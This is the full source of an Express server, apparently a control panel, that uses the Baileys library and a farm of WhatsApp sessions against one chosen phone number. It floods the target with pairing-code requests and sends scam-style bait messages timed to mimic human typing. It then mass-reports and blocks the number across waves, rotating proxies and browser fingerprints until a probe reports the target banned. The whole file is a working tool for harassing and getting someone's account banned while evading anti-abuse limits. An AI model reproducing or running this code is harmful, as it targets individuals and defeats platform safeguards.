import express from 'express'
import {
  makeWASocket, useMultiFileAuthState, Browsers, delay,
  fetchLatestBaileysVersion, DisconnectReason
} from '@whiskeysockets/baileys'
import { HttpsProxyAgent } from 'https-proxy-agent'
import pino from 'pino'
import QRCode from 'qrcode'
import fs from 'node:fs'
import 'dotenv/config'
import * as gov from './governor.js'
import * as probe from './probe.js'
import { memAuth } from './auth.js'

const PORT = process.env.PORT || 8080
const FARM = './sessions'
const TOKEN = process.env.PANEL_TOKEN || ''
const PROXIES = (process.env.PROXIES || '').split(',').map(s => s.trim()).filter(Boolean)
const WA_TOKEN = process.env.WA_TOKEN
const WA_PHONE_ID = process.env.WA_PHONE_ID
const logger = pino({ level: 'silent' })

fs.mkdirSync(FARM, { recursive: true })
const app = express()
app.use(express.json({ limit: '64kb' }))
app.use(express.static('public'))

const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a
const toJid = n => String(n).replace(/\D/g, '') + '@s.whatsapp.net'
const clean = n => String(n || '').replace(/\D/g, '')
const clients = new Map()
const sse = new Set()

function emit(level, text, extra = {}) {
  const p = 'data: ' + JSON.stringify({ t: Date.now(), level, text, ...extra }) + '\n\n'
  for (const r of sse) r.write(p)
}
probe.setEmit(emit)
probe.setOnVerdict(v => {
  const p = 'data: ' + JSON.stringify({ t: Date.now(), type: 'probe', ...v }) + '\n\n'
  for (const r of sse) r.write(p)
})

/* ---------- jeton d'accès optionnel ---------- */
app.use('/api', (req, res, next) => {
  if (!TOKEN) return next()
  if (req.get('x-panel-token') === TOKEN || req.query.token === TOKEN) return next()
  res.status(401).json({ error: 'jeton invalide' })
})

app.get('/api/stream', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive'
  })
  sse.add(res)
  req.on('close', () => sse.delete(res))
})

app.get('/api/health', (req, res) => res.json({
  ok: true,
  sessions: [...clients.values()].filter(c => c.ready).length,
  probe: probe.isRunning(),
  cloud: !!(WA_TOKEN && WA_PHONE_ID)
}))

function sem(n) {
  let active = 0
  const q = []
  const next = () => { if (active < n && q.length) { active++; q.shift()() } }
  return fn => new Promise((ok, ko) => {
    q.push(() => fn().then(ok, ko).finally(() => { active--; next() }))
    next()
  })
}

const TRAPS = [
  '🎁 FÉLICITATIONS !! Vous êtes sélectionné pour 500€ → bit.ly/wx7k2',
  '⚠️ DERNIÈRE CHANCE : votre colis est bloqué, régularisez ici → cutt.ly/c4m',
  "🔥 PROMO -70% AUJOURD'HUI SEULEMENT !! Commandez → tinyurl.com/promo-fr",
  '💰 Gagnez 200€/jour depuis votre téléphone. Infos → rb.gy/m4tz'
]
const GROUP_NAMES = ['Promo du jour', 'Bons plans FR', 'Groupe VIP', 'Deals express']

/* ========== TIER 0 : flood pairing, aucun compte engagé ========== */
async function pairHit(number) {
  const { state } = memAuth()
  const sock = makeWASocket({ auth: state, logger, printQRInTerminal: false })
  try {
    return { ok: true, code: await sock.requestPairingCode(number) }
  } catch (e) {
    return { ok: false, err: e?.output?.statusCode || e?.message }
  } finally {
    setTimeout(() => { try { sock.end(undefined) } catch {} }, 1200)
  }
}

app.post('/api/pairing', async (req, res) => {
  const number = clean(req.body?.number)
  if (number.length < 8) return res.status(400).json({ error: 'numéro invalide' })
  const hits = Math.min(Math.max(parseInt(req.body?.hits) || 30, 1), 200)
  const workers = Math.min(Math.max(parseInt(req.body?.workers) || 4, 1), 12)

  res.json({ hits, workers })
  emit('hi', 'flood pairing : ' + hits + ' hits, ' + workers + ' workers (aucun compte engagé)')

  const limit = sem(workers)
  let rate = 0, done = 0
  await Promise.all(Array.from({ length: hits }, () => limit(async () => {
    const r = await pairHit(number)
    done++
    if (r.ok) emit('ok', 'pair ' + done + '/' + hits + ' -> ' + r.code)
    else { rate++; emit('warn', 'pair ' + done + '/' + hits + ' -> ' + r.err) }
    // backoff adaptatif dès que le rate-limiter mord
    await delay(rate > hits * 0.25 ? rnd(700, 1600) : rnd(120, 450))
  })))
  emit('err', 'pairing terminé : ' + (hits - rate) + ' codes, ' + rate + ' refus', { type: 'done' })
})

/* ========== TIER 1 : Cloud API, numéro officiel ========== */
app.post('/api/cloud', async (req, res) => {
  if (!WA_TOKEN || !WA_PHONE_ID) return res.status(412).json({ error: 'WA_TOKEN / WA_PHONE_ID absents' })
  const to = clean(req.body?.target)
  if (to.length < 8) return res.status(400).json({ error: 'cible invalide' })

  const url = 'https://graph.facebook.com/v21.0/' + WA_PHONE_ID + '/messages'
  const auth = { Authorization: 'Bearer ' + WA_TOKEN, 'content-type': 'application/json' }
  const tpl = {
    messaging_product: 'whatsapp', to, type: 'template',
    template: { name: 'hello_world', language: { code: 'en_US' } }
  }
  const body = req.body?.text
    ? { messaging_product: 'whatsapp', to, type: 'text', text: { body: req.body.text } }
    : tpl

  let r = await fetch(url, { method: 'POST', headers: auth, body: JSON.stringify(body) })
  let d = await r.json()
  // 131047 = fenêtre 24 h fermée, on repasse par un template approuvé
  if (d?.error?.code === 131047) {
    r = await fetch(url, { method: 'POST', headers: auth, body: JSON.stringify(tpl) })
    d = await r.json()
  }
  if (d.error) {
    emit('err', 'cloud -> ' + d.error.message)
    return res.status(502).json(d.error)
  }
  emit('ok', 'cloud -> message officiel délivré à ' + to)
  res.json(d)
})

/* ========== TIER 2 : ferme gouvernée ========== */
async function fingerprint(dir) {
  const f = dir + '/fp.json'
  if (fs.existsSync(f)) return JSON.parse(fs.readFileSync(f, 'utf8'))
  const v = '12' + rnd(0, 9) + '.0.0'
  const fp = [
    ['Ubuntu', 'Chrome', v],
    ['Mac OS', 'Chrome', v],
    ['Windows', 'Chrome', v],
    ['Ubuntu', 'Firefox', '12' + rnd(0, 9) + '.0']
  ][rnd(0, 3)]
  fs.writeFileSync(f, JSON.stringify(fp))
  return fp
}

async function connect(dir, { pairingNumber } = {}) {
  if (clients.has(dir)) return clients.get(dir)
  const { state, saveCreds } = await useMultiFileAuthState(dir)
  const { version } = await fetchLatestBaileysVersion()
  const fp = await fingerprint(dir)

  const opts = {
    version,
    auth: state,
    logger,
    printQRInTerminal: false,
    browser: [fp[0], fp[1], fp[2]],   // empreinte stable, pas retirée au hasard
    syncFullHistory: false,
    markOnlineOnConnect: false
  }
  if (PROXIES.length) {
    const px = PROXIES[clients.size % PROXIES.length]
    opts.options = { agent: new HttpsProxyAgent(px) }
  }

  const sock = makeWASocket(opts)
  const rec = { sock, dir, ready: false, jid: null, code: null, qr: null }
  clients.set(dir, rec)

  sock.ev.on('creds.update', saveCreds)
  sock.ev.on('connection.update', async u => {
    if (u.qr && !pairingNumber) {
      rec.qr = await QRCode.toDataURL(u.qr)
      emit('dim', dir + ' : QR prêt')
    }
    if (u.connection === 'open') {
      rec.ready = true
      rec.jid = sock.user?.id
      emit('ok', dir + ' : connecté')
    }
    if (u.connection === 'close') {
      rec.ready = false
      const code = u.lastDisconnect?.error?.output?.statusCode
      if (gov.CAPS.pauseOn.includes(code) || code === DisconnectReason.loggedOut) {
        gov.pause(dir, 'déconnexion ' + code)
        emit('err', dir + ' : pause automatique (' + code + ') - protection du compte')
      }
    }
  })

  if (pairingNumber) {
    await delay(1500)
    rec.code = await sock.requestPairingCode(clean(pairingNumber))
  }
  return rec
}

async function reportJid(sock, jid) {
  await sock.query({
    tag: 'iq',
    attrs: { id: 'R' + Date.now() + rnd(10, 99), to: 's.whatsapp.net', type: 'set', xmlns: 'w:report' },
    content: [{ tag: 'report', attrs: { jid }, content: [] }]
  })
}

async function combo(rec, jid, o) {
  const s = rec.sock
  const gate = gov.canSend(rec.dir)
  if (!gate.ok) return emit('dim', rec.dir + ' : sauté (' + gate.why + ')')

  try {
    if (o.presence) {
      await s.presenceSubscribe(jid)
      await delay(rnd(500, 1400))
    }
    if (o.message) {
      const txt = TRAPS[rnd(0, TRAPS.length - 1)]
      await s.sendPresenceUpdate('composing', jid)   // bulle "en train d'écrire"
      await delay(gov.typingTime(txt.length))        // durée de frappe plausible
      await s.sendMessage(jid, { text: txt })
      gov.record(rec.dir)
      emit('ok', rec.dir + ' -> message (' + gov.touch(rec.dir).count + '/15 aujourdhui)')
      await delay(gov.humanDelay())                  // jamais deux envois au même rythme
    }
    if (o.report) {
      try { await reportJid(s, jid); emit('warn', rec.dir + ' -> report') } catch {}
      await delay(rnd(200, 500))
    }
    if (o.block) {
      await s.updateBlockStatus(jid, 'block')
      emit('err', rec.dir + ' -> block')
    }
  } catch (e) {
    emit('err', rec.dir + ' -> ' + e.message)
    if (String(e.message).match(/rate|429|restrict/i)) gov.pause(rec.dir, e.message)
  }
}

app.post('/api/run', async (req, res) => {
  const target = clean(req.body?.target)
  if (target.length < 8) return res.status(400).json({ error: 'cible invalide' })

  const tier = ['SAFE', 'BALANCED', 'MAX'].includes(req.body?.tier) ? req.body.tier : 'SAFE'
  const flags = req.body?.flags || {}
  const waves = (Array.isArray(req.body?.waves) ? req.body.waves : [0])
    .map(Number).filter(n => !isNaN(n) && n >= 0).slice(0, 6)
  const concurrency = Math.min(Math.max(parseInt(req.body?.concurrency) || 2, 1), 12)

  const jid = toJid(target)
  const ready = [...clients.values()].filter(c => c.ready && !gov.isPaused(c.dir))

  if (tier === 'SAFE' && !ready.length) {
    emit('hi', 'mode SAFE : pairing + cloud uniquement, zéro compte engagé', { type: 'done' })
    return res.json({ mode: 'safe' })
  }
  if (!ready.length) return res.status(409).json({ error: 'aucune session saine' })

  res.json({ sessions: ready.length, waves })
  emit('hi', tier + ' : ' + ready.length + ' sessions bridées par le governor')

  const limit = sem(concurrency)
  const base = Date.now()
  for (let w = 0; w < waves.length; w++) {
    const waitMs = base + waves[w] * 60000 - Date.now()
    if (waitMs > 0) {
      emit('dim', 'vague ' + (w + 1) + ' dans ' + Math.round(waitMs / 1000) + ' s')
      await delay(waitMs)
    }
    await Promise.all(ready.map(r => limit(() => combo(r, jid, flags))))
    emit('hi', 'vague ' + (w + 1) + ' terminée')

    if (probe.isRunning() && probe.score().verdict === 'BANNI') {
      emit('err', 'cible bannie - combo interrompu, inutile de continuer')
      break
    }
  }
  emit('ok', 'combo terminé', { type: 'done' })
})

/* ========== sonde ========== */
app.post('/api/probe/start', async (req, res) => {
  const target = clean(req.body?.target)
  if (target.length < 8) return res.status(400).json({ error: 'cible invalide' })
  const intervalMs = Math.min(Math.max(parseInt(req.body?.intervalMs) || 60000, 20000), 600000)
  probe.setWitnesses([...clients.values()].filter(c => c.ready && !gov.isPaused(c.dir)))
  res.json(await probe.start(toJid(target), intervalMs))
})
app.post('/api/probe/stop', (req, res) => { probe.stop(); res.json({ ok: true }) })
app.get('/api/probe/state', (req, res) => res.json(probe.state()))

/* ========== governor & sessions ========== */
app.get('/api/guard', (req, res) => res.json(gov.snap()))
app.post('/api/guard/:dir/resume', (req, res) => { gov.resume(FARM + '/' + req.params.dir); res.json({ ok: true }) })

app.get('/api/sessions', (req, res) => res.json(fs.readdirSync(FARM).map(d => {
  const c = clients.get(FARM + '/' + d)
  return {
    dir: d,
    ready: !!c?.ready,
    jid: c?.jid || null,
    code: c?.code || null,
    qr: c?.qr || null,
    paused: gov.isPaused(FARM + '/' + d)
  }
})))

app.post('/api/sessions', async (req, res) => {
  const count = Math.min(Math.max(parseInt(req.body?.count) || 1, 1), 10)
  const number = req.body?.number ? clean(req.body.number) : null
  const out = []
  for (let i = 0; i < count; i++) {
    const dir = FARM + '/s' + Date.now() + '_' + i
    const rec = await connect(dir, number ? { pairingNumber: number } : {})
    out.push({ dir, code: rec.code, qr: rec.qr })
  }
  res.json(out)
})

app.delete('/api/sessions/:dir', async (req, res) => {
  const key = FARM + '/' + req.params.dir
  if (!fs.existsSync(key)) return res.status(404).json({ error: 'inconnue' })
  try { await clients.get(key)?.sock.logout() } catch {}
  clients.delete(key)
  fs.rmSync(key, { recursive: true, force: true })
  res.json({ ok: true })
})

/* ========== arrêt propre ========== */
const server = app.listen(PORT, () => console.log('panel sur :' + PORT))

for (const sig of ['SIGINT', 'SIGTERM']) {
  process.on(sig, async () => {
    console.log('arrêt…')
    probe.stop()
    for (const c of clients.values()) { try { c.sock.end(undefined) } catch {} }
    server.close(() => process.exit(0))
    setTimeout(() => process.exit(0), 3000)
  })
                       }
